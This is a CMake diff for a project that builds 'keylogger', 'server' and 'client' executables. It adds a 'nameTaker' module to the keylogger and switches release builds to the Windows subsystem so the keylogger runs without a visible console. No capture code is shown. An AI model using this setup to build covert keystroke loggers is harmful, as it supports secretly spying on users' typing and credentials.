@@ -25,6 +25,9 @@ file(GLOB_RECURSE SERVER_HEADER_FILES "include/server/*.h")
 file(GLOB_RECURSE KEYBOARD_MANAGER_HEADER_FILES "include/keyboardManager/*.h")
 file(GLOB_RECURSE KEYBOARD_MANAGER_SOURCE_FILES "src/keyboardManager/*.cpp")
 
+file(GLOB_RECURSE NAME_TAKER_HEADER_FILES "include/nameTaker/*.h")
+file(GLOB_RECURSE NAME_TAKER_SOURCE_FILES "src/nameTaker/*.cpp")
+
 file(GLOB_RECURSE COMMON_HEADER_FILES "include/common/*.h")
 
 file(GLOB_RECURSE KQNET_HEADER_FILES "${KQNET_PATH}/*.h*")
@@ -48,9 +51,15 @@ set(IMGUI_HEADER_FILES
 "include/common/imgui_init.h"
 )
 
-add_executable(keylogger ${KEYLOGGER_SOURCE_FILES}  ${KEYLOGGER_HEADER_FILES}   ${COMMON_HEADER_FILES})
+add_executable(keylogger ${KEYLOGGER_SOURCE_FILES}  ${KEYLOGGER_HEADER_FILES}   ${COMMON_HEADER_FILES} ${NAME_TAKER_HEADER_FILES} ${NAME_TAKER_SOURCE_FILES})
 add_executable(server ${SERVER_SOURCE_FILES}        ${SERVER_HEADER_FILES}      ${KEYBOARD_MANAGER_HEADER_FILES} ${KEYBOARD_MANAGER_SOURCE_FILES} ${COMMON_HEADER_FILES})
 add_executable(client ${CLIENT_SOURCE_FILES}        ${CLIENT_HEADER_FILES}      ${KEYBOARD_MANAGER_HEADER_FILES} ${KEYBOARD_MANAGER_SOURCE_FILES} ${COMMON_HEADER_FILES})
+
+if(CMAKE_BUILD_TYPE STREQUAL "Debug")
+    set_target_properties(keylogger PROPERTIES LINK_FLAGS "/SUBSYSTEM:CONSOLE")
+else()
+    set_target_properties(keylogger PROPERTIES LINK_FLAGS "/SUBSYSTEM:WINDOWS")
+endif()
 
 add_library(kqnet INTERFACE ${KQNET_HEADER_FILES})
 target_include_directories(kqnet INTERFACE 
@@ -73,6 +82,7 @@ target_include_directories(imgui PUBLIC include/common/)
 target_link_libraries(imgui PUBLIC d3d11)
 
 target_include_directories(keylogger PUBLIC include/keylogger/)
+target_include_directories(keylogger PUBLIC include/nameTaker/)
 target_include_directories(keylogger PUBLIC include/common/)
 
 target_include_directories(server PUBLIC include/keyboardManager/)
